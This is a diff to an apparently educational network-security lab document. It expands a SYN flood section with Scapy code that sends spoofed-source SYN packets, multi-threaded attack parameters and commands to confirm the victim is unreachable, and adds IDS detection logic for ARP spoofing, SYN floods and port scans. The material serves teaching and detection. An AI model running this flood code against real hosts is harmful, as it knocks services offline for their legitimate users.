@@ -391,7 +391,7 @@ def spoof(target_ip, spoof_ip, target_mac):
 ### Attack 2: SYN Flood (Denial of Service)
 
 **What is SYN Flood?**
-Exploits the TCP 3-way handshake to exhaust server resources.
+Exploits the TCP 3-way handshake to exhaust server resources by sending thousands of SYN packets with spoofed source IPs.
 
 **Normal TCP Handshake:**
 ```
@@ -403,49 +403,136 @@ Exploits the TCP 3-way handshake to exhaust server resources.
 
 **SYN Flood Attack:**
 ```
-1. Attacker → Server:  SYN (with fake source IP 1.2.3.4)
-2. Server → 1.2.3.4:   SYN-ACK (waits for ACK...)
-3. Attacker → Server:  SYN (with fake source IP 5.6.7.8)
-4. Server → 5.6.7.8:   SYN-ACK (waits for ACK...)
-   ... repeat 1000s of times ...
+1. Attacker → Server:  SYN (with fake source IP 172.45.88.123)
+2. Server → 172.45.88.123:   SYN-ACK (waits for ACK that never comes...)
+3. Attacker → Server:  SYN (with fake source IP 10.200.5.67)
+4. Server → 10.200.5.67:   SYN-ACK (waits for ACK...)
+5. Attacker → Server:  SYN (with fake source IP 192.88.44.199)
+   ... repeat thousands of times per second ...
    
-Server's connection queue is FULL → Can't accept legitimate connections!
+Server's connection queue fills up (SYN_RECV state)
+→ Legitimate clients can't connect!
+→ Services become unresponsive (DoS achieved)
 ```
+
+**Attack Parameters:**
+- **Target:** Any open port (SSH on 22, HTTP on 80, etc.)
+- **Threads:** 10-50 concurrent attack threads
+- **Rate:** Unlimited packets per second (or rate-limited)
+- **IP Spoofing:** 100+ random fake source IPs (simulates botnet)
+
+**Why It Works:**
+1. Server allocates resources for each SYN-ACK (half-open connection)
+2. Fake IPs never respond → connections stay in SYN_RECV state
+3. Connection queue fills (typically 128-1024 slots)
+4. No resources left for legitimate connections
 
 **Code Implementation:**
 ```python
 # modules/syn_flood.py
+def _generate_random_ip(self):
+    """Generate fake IP address"""
+    return ".".join(str(random.randint(1, 254)) for _ in range(4))
+    # Example output: "172.45.88.123"
+
 def _send_syn_packet(self):
     """Send TCP SYN with random source IP"""
-    src_ip = self._generate_random_ip()  # Fake IP
+    src_ip = self._generate_random_ip()  # Fake IP (botnet simulation)
+    target_ip, target_port = self._choose_target()
     
-    ip_layer = IP(src=src_ip, dst=self.target_ip)
-    tcp_layer = TCP(sport=random.randint(1024, 65535), 
-                    dport=self.target_port, 
-                    flags="S")  # SYN flag
+    ip_layer = IP(src=src_ip, dst=target_ip)  # Spoofed source
+    tcp_layer = TCP(
+        sport=random.randint(1024, 65535),  # Random source port
+        dport=target_port,                   # Target service port
+        flags="S"                            # SYN flag only
+    )
     
     packet = ip_layer / tcp_layer
     send(packet, verbose=False)
+    self.packets_sent += 1
+```
+
+**Testing on Victim:**
+```bash
+# Monitor SYN queue on victim machine
+watch -n 1 'netstat -tan | grep SYN_RECV | wc -l'
+
+# During attack, you'll see:
+# 450+ connections in SYN_RECV state
+
+# Try to connect (will fail/timeout):
+ssh victim_ip  # Connection times out
+curl http://victim_ip  # No response
 ```
 
 ---
 
 ### Detection: How IDS Works
 
-**ARP Spoofing Detection:**
+**1. ARP Spoofing Detection:**
 ```python
-# modules/detector.py
+# modules/ids_monitor.py
 def detect_arp_spoof(packet):
     """Detect duplicate IPs with different MACs"""
-    if ARP in packet:
+    if ARP in packet and packet[ARP].op == 2:  # ARP reply
         ip = packet[ARP].psrc
         mac = packet[ARP].hwsrc
         
         # Check if we've seen this IP before with different MAC
         if ip in arp_table and arp_table[ip] != mac:
             ⚠️ ALERT: ARP Spoofing Detected!
-            Old MAC: arp_table[ip]
-            New MAC: mac
+            IP: {ip}
+            Old MAC: {arp_table[ip]}
+            New MAC: {mac}
+```
+
+**2. SYN Flood Detection:**
+```python
+# modules/ids_monitor.py
+def detect_syn_flood(packet):
+    """Detect high rate of SYN packets"""
+    if TCP in packet and packet[TCP].flags & 0x02:  # SYN flag
+        dst_ip = packet[IP].dst
+        src_ip = packet[IP].src
+        timestamp = time.time()
+        
+        # Track SYNs per destination in 10-second window
+        syn_history[dst_ip].append((timestamp, src_ip))
+        
+        # Count recent SYNs and unique sources
+        recent_syns = [s for (ts, s) in syn_history[dst_ip] 
+                      if ts > timestamp - 10]
+        unique_sources = len(set(recent_syns))
+        
+        if len(recent_syns) >= 150 and unique_sources >= 15:
+            ⚠️ CRITICAL ALERT: SYN Flood Detected!
+            Target: {dst_ip}
+            SYN count: {len(recent_syns)} in 10 seconds
+            Unique sources: {unique_sources}
+            Attack vectors: Distributed (botnet-style)
+```
+
+**3. Port Scan Detection:**
+```python
+def detect_port_scan(packet):
+    """Detect scanning of multiple ports"""
+    if TCP in packet and packet[TCP].flags & 0x02:  # SYN
+        src_ip = packet[IP].src
+        dst_port = packet[TCP].dport
+        
+        # Track ports accessed by each source
+        scan_history[src_ip].append((time.time(), dst_port))
+        
+        # Count unique ports in 10-second window
+        recent_ports = [p for (ts, p) in scan_history[src_ip]
+                       if ts > time.time() - 10]
+        unique_ports = len(set(recent_ports))
+        
+        if unique_ports >= 10:
+            ⚠️ ALERT: Port Scan Detected!
+            Scanner: {src_ip}
+            Ports scanned: {unique_ports}
+            Behavior: Reconnaissance before attack
 ```
 
 **SYN Flood Detection:**
